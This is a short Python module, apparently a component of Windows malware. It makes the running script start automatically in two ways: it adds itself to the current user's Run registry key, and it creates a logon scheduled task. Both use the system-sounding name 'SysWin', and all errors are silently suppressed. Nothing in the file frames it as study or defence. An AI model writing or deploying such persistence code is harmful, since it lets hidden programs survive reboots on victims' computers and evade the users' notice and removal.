import os, winreg, subprocess
def registrar(nome="SysWin"):
    exe = os.path.abspath(__file__)
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, nome, 0, winreg.REG_SZ, exe)
        winreg.CloseKey(key)
    except: pass
def agendar(nome="SysWin"):
    exe = os.path.abspath(__file__)
    try:
        subprocess.call(f'schtasks /create /sc onlogon /tn "{nome}" /tr "{exe}" /f', shell=True)
    except: pass